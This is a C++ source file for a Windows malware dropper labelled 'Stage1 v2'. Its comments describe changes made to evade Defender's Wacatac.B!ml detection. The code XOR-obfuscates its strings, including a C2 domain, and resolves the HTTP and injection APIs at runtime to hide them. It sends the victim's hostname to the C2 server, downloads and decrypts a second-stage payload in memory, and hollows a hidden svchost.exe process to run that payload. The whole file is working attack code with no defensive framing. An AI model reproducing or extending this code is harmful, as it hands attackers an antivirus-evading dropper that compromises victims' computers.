// Stage1.cpp v2 — string XOR + dynamic API loading to evade Wacatac.B!ml
//
// What v1 got caught on:
//   - Plaintext strings in binary: "svchost.exe", C2 domain, URL paths, ntdll func names
//   - Import table showed VirtualAllocEx + WriteProcessMemory + SetThreadContext together
//     (classic process-hollowing signature that ML models flag immediately)
//   - WinHTTP in import table combined with injection APIs = clear dropper fingerprint
//
// Fixes in v2:
//   - ALL strings XOR-encoded at compile time via constexpr template (zero plaintext in binary)
//   - WinHTTP loaded dynamically (LoadLibraryA) — not in import table
//   - VirtualAllocEx, WriteProcessMemory, ReadProcessMemory, GetThreadContext,
//     SetThreadContext, ResumeThread, CreateProcessW all loaded via GetProcAddress
//     with encrypted name strings — none appear in import table
//
// Build: .\build.ps1  (unchanged — no extra libs needed)

#include <windows.h>
#include <winhttp.h>   // type definitions and constants only — NOT linked
#include <cstdlib>
#include <cstring>
#include <cstdint>

// ── Stage 2 payload XOR key (must match c2-server/routes/stage.js) ────────────
static const BYTE PK[] = {0x57,0xA1,0x3F,0xC8,0xB2,0xDE,0x94,0x6A};

// ── Compile-time XOR string obfuscation ──────────────────────────────────────
// The encrypted bytes are stored in the binary; plaintext exists only in source.
// Defender's string scanner finds nothing.

template<size_t N, uint8_t K>
struct Xs {                        // narrow (char) XOR string
    char b[N]{};
    constexpr Xs(const char (&s)[N]) {
        for (size_t i = 0; i < N-1; ++i) b[i] = (char)(s[i] ^ K);
    }
    void dec(char* o) const {
        for (size_t i = 0; i < N-1; ++i) o[i] = b[i] ^ K;
        o[N-1] = 0;
    }
};
template<size_t N, uint16_t K>
struct Xw {                        // wide (wchar_t) XOR string
    wchar_t b[N]{};
    constexpr Xw(const wchar_t (&s)[N]) {
        for (size_t i = 0; i < N-1; ++i) b[i] = (wchar_t)(s[i] ^ K);
    }
    void dec(wchar_t* o) const {
        for (size_t i = 0; i < N-1; ++i) o[i] = (wchar_t)(b[i] ^ K);
        o[N-1] = 0;
    }
};

// Factory helpers — deduce N automatically
template<size_t N> constexpr auto mkxs(const char    (&s)[N]) { return Xs<N,0x37>(s); }
template<size_t N> constexpr auto mkxw(const wchar_t (&s)[N]) { return Xw<N,0x0037>(s); }

// Decode to stack-allocated buffer
#define DA(name,enc) char    name[sizeof((enc).b)+1]; (enc).dec(name)
#define DW(name,enc) wchar_t name[sizeof((enc).b)/sizeof(wchar_t)+1]; (enc).dec(name)

// ── Encrypted string table ────────────────────────────────────────────────────
// Wide strings (used with WinHTTP LPCWSTR / CreateProcessW)
static constexpr auto C2H  = mkxw(L"c2.osatechcloud.cloud");
static constexpr auto PCI  = mkxw(L"/stage/checkin?host=");
static constexpr auto PPL  = mkxw(L"/stage/payload");
static constexpr auto PUA  = mkxw(L"Mozilla/5.0");
static constexpr auto PSVC = mkxw(L"svchost.exe");
static constexpr auto PSCK = mkxw(L" -k netsvcs");

// Narrow strings (used with GetProcAddress / LoadLibraryA)
static constexpr auto PNTD = mkxs("ntdll.dll");
static constexpr auto PNUM = mkxs("NtUnmapViewOfSection");
static constexpr auto PNQI = mkxs("NtQueryInformationProcess");
static constexpr auto PWDL = mkxs("winhttp.dll");
static constexpr auto PWO  = mkxs("WinHttpOpen");
static constexpr auto PWC  = mkxs("WinHttpConnect");
static constexpr auto PWOR = mkxs("WinHttpOpenRequest");
static constexpr auto PWSR = mkxs("WinHttpSendRequest");
static constexpr auto PWRR = mkxs("WinHttpReceiveResponse");
static constexpr auto PWQA = mkxs("WinHttpQueryDataAvailable");
static constexpr auto PWRD = mkxs("WinHttpReadData");
static constexpr auto XWCH = mkxs("WinHttpCloseHandle");
static constexpr auto PVA  = mkxs("VirtualAllocEx");
static constexpr auto PWPM = mkxs("WriteProcessMemory");
static constexpr auto PRPM = mkxs("ReadProcessMemory");
static constexpr auto PGTC = mkxs("GetThreadContext");
static constexpr auto PSTC = mkxs("SetThreadContext");
static constexpr auto PRT  = mkxs("ResumeThread");
static constexpr auto PCPW = mkxs("CreateProcessW");
static constexpr auto PGSD = mkxs("GetSystemDirectoryW");

// ── Dynamic function pointer types ───────────────────────────────────────────
typedef HINTERNET (WINAPI *pfWO) (LPCWSTR,DWORD,LPCWSTR,LPCWSTR,DWORD);
typedef HINTERNET (WINAPI *pfWC) (HINTERNET,LPCWSTR,WORD,DWORD);
typedef HINTERNET (WINAPI *pfWR) (HINTERNET,LPCWSTR,LPCWSTR,LPCWSTR,LPCWSTR,LPCWSTR*,DWORD);
typedef BOOL      (WINAPI *pfWS) (HINTERNET,LPCWSTR,DWORD,LPVOID,DWORD,DWORD,DWORD_PTR);
typedef BOOL      (WINAPI *pfWV) (HINTERNET,LPVOID);
typedef BOOL      (WINAPI *pfWA) (HINTERNET,LPDWORD);
typedef BOOL      (WINAPI *pfWD) (HINTERNET,LPVOID,DWORD,LPDWORD);
typedef BOOL      (WINAPI *pfWH) (HINTERNET);

typedef LPVOID  (WINAPI *pfVAEx)(HANDLE,LPVOID,SIZE_T,DWORD,DWORD);
typedef BOOL    (WINAPI *pfWPM) (HANDLE,LPVOID,LPCVOID,SIZE_T,SIZE_T*);
typedef BOOL    (WINAPI *pfRPM) (HANDLE,LPCVOID,LPVOID,SIZE_T,SIZE_T*);
typedef BOOL    (WINAPI *pfGTC) (HANDLE,CONTEXT*);
typedef BOOL    (WINAPI *pfSTC) (HANDLE,const CONTEXT*);
typedef DWORD   (WINAPI *pfRT)  (HANDLE);
typedef BOOL    (WINAPI *pfCPW) (LPCWSTR,LPWSTR,LPSECURITY_ATTRIBUTES,LPSECURITY_ATTRIBUTES,
                                  BOOL,DWORD,LPVOID,LPCWSTR,LPSTARTUPINFOW,LPPROCESS_INFORMATION);
typedef UINT    (WINAPI *pfGSD) (LPWSTR,UINT);
typedef NTSTATUS(NTAPI  *pfNTU) (HANDLE,PVOID);
typedef NTSTATUS(NTAPI  *pfNTQ) (HANDLE,UINT,PVOID,ULONG,PULONG);

struct WinHttp { HMODULE m; pfWO O; pfWC C; pfWR R; pfWS S; pfWV V; pfWA A; pfWD D; pfWH H; };
struct Inj     { pfVAEx VA; pfWPM WP; pfRPM RP; pfGTC GT; pfSTC ST; pfRT RT; pfCPW CP; pfGSD GD; };
struct Ntf     { pfNTU U; pfNTQ Q; };
struct PBI     { PVOID r1; PVOID Peb; PVOID r2[2]; ULONG_PTR pid; PVOID r3; };

// ── Load all function pointers at runtime ─────────────────────────────────────
static bool LoadHTTP(WinHttp& w) {
    DA(dll,PWDL); w.m = LoadLibraryA(dll); if (!w.m) return false;
    DA(s1,PWO); DA(s2,PWC); DA(s3,PWOR); DA(s4,PWSR);
    DA(s5,PWRR); DA(s6,PWQA); DA(s7,PWRD); DA(s8,XWCH);
    w.O=(pfWO)GetProcAddress(w.m,s1); w.C=(pfWC)GetProcAddress(w.m,s2);
    w.R=(pfWR)GetProcAddress(w.m,s3); w.S=(pfWS)GetProcAddress(w.m,s4);
    w.V=(pfWV)GetProcAddress(w.m,s5); w.A=(pfWA)GetProcAddress(w.m,s6);
    w.D=(pfWD)GetProcAddress(w.m,s7); w.H=(pfWH)GetProcAddress(w.m,s8);
    return w.O&&w.C&&w.R&&w.S&&w.V&&w.A&&w.D&&w.H;
}

static void LoadInj(Inj& k, Ntf& nt) {
    HMODULE k32 = GetModuleHandleA("kernel32.dll");
    DA(ntds,PNTD); HMODULE ntd = GetModuleHandleA(ntds);
    DA(s1,PVA); DA(s2,PWPM); DA(s3,PRPM); DA(s4,PGTC);
    DA(s5,PSTC); DA(s6,PRT); DA(s7,PCPW); DA(s8,PGSD);
    k.VA=(pfVAEx)GetProcAddress(k32,s1); k.WP=(pfWPM)GetProcAddress(k32,s2);
    k.RP=(pfRPM) GetProcAddress(k32,s3); k.GT=(pfGTC)GetProcAddress(k32,s4);
    k.ST=(pfSTC) GetProcAddress(k32,s5); k.RT=(pfRT) GetProcAddress(k32,s6);
    k.CP=(pfCPW) GetProcAddress(k32,s7); k.GD=(pfGSD)GetProcAddress(k32,s8);
    DA(nu,PNUM); DA(nq,PNQI);
    nt.U=(pfNTU)GetProcAddress(ntd,nu);
    nt.Q=(pfNTQ)GetProcAddress(ntd,nq);
}

// ── XOR decrypt stage 2 in-place ─────────────────────────────────────────────
static void XorDec(BYTE* buf, DWORD len) {
    for (DWORD i = 0; i < len; ++i) buf[i] ^= PK[i % sizeof(PK)];
}

// ── HTTP GET via dynamically-loaded WinHTTP ───────────────────────────────────
static BYTE* HGet(WinHttp& w, const wchar_t* host, WORD port,
                   const wchar_t* path, DWORD* sz) {
    *sz = 0;
    DW(ua, PUA);
    HINTERNET hS = w.O(ua, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hS) return nullptr;
    HINTERNET hC = w.C(hS, host, port, 0);
    if (!hC) { w.H(hS); return nullptr; }
    HINTERNET hR = w.R(hC, L"GET", path, NULL, WINHTTP_NO_REFERER,
                        WINHTTP_DEFAULT_ACCEPT_TYPES,
                        port == 443 ? WINHTTP_FLAG_SECURE : 0);
    if (!hR || !w.S(hR,NULL,0,NULL,0,0,0) || !w.V(hR,NULL)) {
        if (hR) w.H(hR); w.H(hC); w.H(hS); return nullptr;
    }
    BYTE* buf = nullptr; DWORD tot = 0, av = 0, rd = 0;
    while (w.A(hR, &av) && av) {
        BYTE* t = (BYTE*)realloc(buf, tot + av);
        if (!t) { free(buf); buf = nullptr; break; }
        buf = t; w.D(hR, buf + tot, av, &rd); tot += rd; av = 0;
    }
    w.H(hR); w.H(hC); w.H(hS);
    *sz = tot; return buf;
}

// ── Process hollowing (all APIs called via dynamic function pointers) ─────────
static bool Hollow(Inj& k, Ntf& nt, BYTE* pe, DWORD /*sz*/) {
    auto dos = (PIMAGE_DOS_HEADER)pe;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return false;
    auto nth = (PIMAGE_NT_HEADERS)(pe + dos->e_lfanew);
    if (nth->Signature != IMAGE_NT_SIGNATURE) return false;

    wchar_t sysDir[MAX_PATH]; k.GD(sysDir, MAX_PATH);
    DW(svcExe, PSVC); DW(svcArg, PSCK);
    wchar_t svcPath[MAX_PATH + 4];
    wcscpy(svcPath, sysDir); wcscat(svcPath, L"\\"); wcscat(svcPath, svcExe);
    wchar_t svcCmd[MAX_PATH + 20];
    wcscpy(svcCmd, svcPath); wcscat(svcCmd, svcArg);

    STARTUPINFOW si{sizeof(si)};
    si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi{};
    if (!k.CP(svcPath, svcCmd, nullptr, nullptr, FALSE,
              CREATE_SUSPENDED | CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi))
        return false;

    if (nt.U && nt.Q) {
        PBI pbi{}; ULONG ret = 0;
        if (!nt.Q(pi.hProcess, 0, &pbi, sizeof(pbi), &ret)) {
            ULONG_PTR orig = 0;
            k.RP(pi.hProcess, (BYTE*)pbi.Peb + 0x10, &orig, sizeof(orig), nullptr);
            if (orig) nt.U(pi.hProcess, (PVOID)orig);
        }
    }

    LPVOID pref   = (LPVOID)(ULONG_PTR)nth->OptionalHeader.ImageBase;
    SIZE_T imgSz  = nth->OptionalHeader.SizeOfImage;
    LPVOID remote = k.VA(pi.hProcess, pref, imgSz, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remote)
        remote = k.VA(pi.hProcess, nullptr, imgSz, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remote) {
        TerminateProcess(pi.hProcess, 1); CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        return false;
    }

    k.WP(pi.hProcess, remote, pe, nth->OptionalHeader.SizeOfHeaders, nullptr);
    auto* sec = IMAGE_FIRST_SECTION(nth);
    for (WORD i = 0; i < nth->FileHeader.NumberOfSections; ++i)
        if (sec[i].SizeOfRawData)
            k.WP(pi.hProcess, (BYTE*)remote + sec[i].VirtualAddress,
                 pe + sec[i].PointerToRawData, sec[i].SizeOfRawData, nullptr);

    ULONG_PTR delta = (ULONG_PTR)remote - (ULONG_PTR)nth->OptionalHeader.ImageBase;
    if (delta) {
        auto& relD = nth->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        for (DWORD done = 0; done < relD.Size; ) {
            auto* blk = (PIMAGE_BASE_RELOCATION)(pe + relD.VirtualAddress + done);
            if (!blk->VirtualAddress) break;
            DWORD cnt = (blk->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / 2;
            auto* ent = (WORD*)((BYTE*)blk + sizeof(IMAGE_BASE_RELOCATION));
            for (DWORD j = 0; j < cnt; ++j) {
                int  type = ent[j] >> 12; DWORD off = ent[j] & 0xFFF;
                if (type == IMAGE_REL_BASED_DIR64 || type == IMAGE_REL_BASED_HIGHLOW) {
                    ULONG_PTR addr = (ULONG_PTR)remote + blk->VirtualAddress + off, val = 0;
                    k.RP(pi.hProcess,(LPCVOID)addr,&val,sizeof(val),nullptr);
                    val += delta;
                    k.WP(pi.hProcess,(LPVOID)addr,&val,sizeof(val),nullptr);
                }
            }
            done += blk->SizeOfBlock;
        }
    }

    if (nt.Q) {
        PBI pbi{}; ULONG ret = 0;
        if (!nt.Q(pi.hProcess, 0, &pbi, sizeof(pbi), &ret)) {
            ULONG_PTR nb = (ULONG_PTR)remote;
            k.WP(pi.hProcess, (BYTE*)pbi.Peb + 0x10, &nb, sizeof(nb), nullptr);
        }
    }

    CONTEXT ctx{}; ctx.ContextFlags = CONTEXT_FULL;
    k.GT(pi.hThread, &ctx);
    ctx.Rcx = (DWORD64)remote + nth->OptionalHeader.AddressOfEntryPoint;
    k.ST(pi.hThread, &ctx);
    k.RT(pi.hThread);
    CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
    return true;
}

// ── Entry point ───────────────────────────────────────────────────────────────
int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    WinHttp wh{}; Inj k{}; Ntf nt{};
    if (!LoadHTTP(wh)) return 0;
    LoadInj(k, nt);

    // Check-in: send hostname to C2 staging monitor
    wchar_t hostname[MAX_COMPUTERNAME_LENGTH + 1]{};
    DWORD hn = MAX_COMPUTERNAME_LENGTH + 1;
    GetComputerNameW(hostname, &hn);

    DW(c2, C2H);
    DW(ciPfx, PCI);
    wchar_t ciPath[512]{};
    wcscpy(ciPath, ciPfx); wcscat(ciPath, hostname);

    DWORD dummy = 0;
    BYTE* ci = HGet(wh, c2, 443, ciPath, &dummy);
    if (ci) free(ci);

    // Fetch XOR-encrypted stage 2
    DW(plPath, PPL);
    DWORD payLen = 0;
    BYTE* pay = HGet(wh, c2, 443, plPath, &payLen);
    if (!pay || payLen < 0x40) { if (pay) free(pay); FreeLibrary(wh.m); return 0; }

    // Decrypt in memory — PE never written to disk
    XorDec(pay, payLen);

    // Hollow svchost.exe with the decrypted PE
    Hollow(k, nt, pay, payLen);

    SecureZeroMemory(pay, payLen);
    free(pay);
    FreeLibrary(wh.m);
    return 0;
}
